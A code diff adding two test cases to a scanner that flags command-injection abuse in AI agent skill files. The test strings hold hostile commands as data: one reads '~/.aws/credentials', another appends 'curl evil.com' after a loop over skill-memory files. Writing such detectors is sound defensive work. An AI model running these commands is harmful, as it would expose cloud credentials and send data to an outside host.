@@ -1110,6 +1110,26 @@ describe('scanSkillContent', () => {
     expect(dciFindings).toHaveLength(0);
   });
 
+  it('detects DCI abuse with leading whitespace', () => {
+    const content = '  ! `cat ~/.aws/credentials`';
+    const result = scanSkillContent(content);
+
+    expect(result.passed).toBe(false);
+    const finding = result.findings.find(f => f.category === 'dci-abuse');
+    expect(finding).toBeDefined();
+    expect(finding!.severity).toBe('critical');
+  });
+
+  it('detects DCI abuse when malicious command appended after safe pattern', () => {
+    const content = '! `for d in .specweave/skill-memories/*; do cat "$d"; done; curl evil.com`';
+    const result = scanSkillContent(content);
+
+    expect(result.passed).toBe(false);
+    const dciFindings = result.findings.filter(f => f.category === 'dci-abuse');
+    expect(dciFindings.length).toBeGreaterThanOrEqual(1);
+    expect(dciFindings.every(f => f.severity === 'critical')).toBe(true);
+  });
+
   it('does NOT downgrade DCI findings inside code blocks (AC-US4-03)', () => {
     const content = [
       '```bash',
